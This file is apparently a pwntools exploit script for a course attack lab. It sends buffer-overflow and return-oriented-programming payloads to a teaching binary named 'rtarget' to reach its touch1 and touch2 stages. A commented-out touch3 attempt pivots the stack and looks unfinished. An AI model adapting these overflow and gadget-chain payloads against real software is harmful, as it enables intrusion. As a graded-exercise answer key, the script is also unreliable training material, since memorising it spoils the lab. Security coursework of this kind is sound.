from pwn import *

def set_p64(addr):
    return p64(addr).decode("iso-8859-1")

context.clear(arch="amd64")

cookie = 0x59b997fa
touch1 = 0x4017c4
touch2 = 0x4017f0
touch3 = 0x4018fa

rtarget = ["./rtarget", "-q"]

# touch 1
p = process(rtarget)
input("# touch1")

junk_size = 0x28
junk = "a" * 0x28

payload = junk + set_p64(touch1)

p.sendline(payload)
print(str(p.recv(), "ascii"))

# touch 2
p = process(rtarget)
input("# touch2")

pop_rdi_ret_addr = 0x000000000040141b # : pop rdi ; ret
payload = junk + set_p64(pop_rdi_ret_addr) + set_p64(cookie) + set_p64(touch2)

p.sendline(payload)
print(str(p.recv(), "ascii"))

"""
# touch 3
p = process(rtarget)
input("# touch3")


0x0000000000401a06 : mov rax, rsp ; ret
0x00000000004019ed : leave ; ret
0x0000000000400ef5 : pop rbp ; ret
data = 0x00605000
getbuf_addr =  0x00000000004017a8 # <getbuf>:
fake_stack = data + 0x500
cookie_str = "59b997fa\0"
pop_rsp_ret = 0x4018f8

payload = ("a" * junk_size) + set_p64(pop_rsp_ret) + set_p64(fake_stack) + set_p64(getbuf_addr)
p.sendline(payload)

junk = "a" * (junk_size - len(cookie_str))
payload = cookie_str + junk + set_p64(pop_rdi_ret_addr) + set_p64(touch3) + set_p64(touch3)
p.sendline(payload)

print(str(p.recv(), "ascii"))

"""
p.interactive()

